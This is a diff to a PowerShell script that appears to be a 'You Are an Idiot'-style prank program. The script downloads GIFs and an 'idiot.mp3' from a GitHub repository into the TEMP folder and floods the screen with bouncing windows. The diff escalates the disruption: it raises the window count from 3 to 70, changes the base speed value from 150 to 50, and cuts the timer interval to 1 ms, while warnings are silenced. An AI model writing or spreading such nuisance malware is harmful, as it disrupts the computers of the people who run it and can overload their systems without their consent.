@@ -4,11 +4,11 @@ $WarningPreference = 'SilentlyContinue'
 $GifUrl1 = "https://raw.githubusercontent.com/Aas6d54asd/XD/refs/heads/main/white2.gif"
 $GifUrl2 = "https://raw.githubusercontent.com/Aas6d54asd/XD/refs/heads/main/black2.gif"
 
-$PocetOken = 3
+$PocetOken = 70
 $Sirka = 352
 $Vyska = 264
 $PrepinaniInterval = 1
-$BaseRychlost = 150
+$BaseRychlost = 50
 
 $MusicUrl = "https://github.com/Aas6d54asd/XD/raw/refs/heads/main/idiot.mp3"
 $tmp = "$env:TEMP\song.mp3"
@@ -59,7 +59,7 @@ for ($i = 1; $i -le $PocetOken; $i++) {
     }
 
     $timer = New-Object System.Windows.Forms.Timer
-    $timer.Interval = 10
+    $timer.Interval = 1
     $timer.Add_Tick({
         $st = $state
         $newX = $form.Left + ($st.DirectionX * $st.SpeedX)
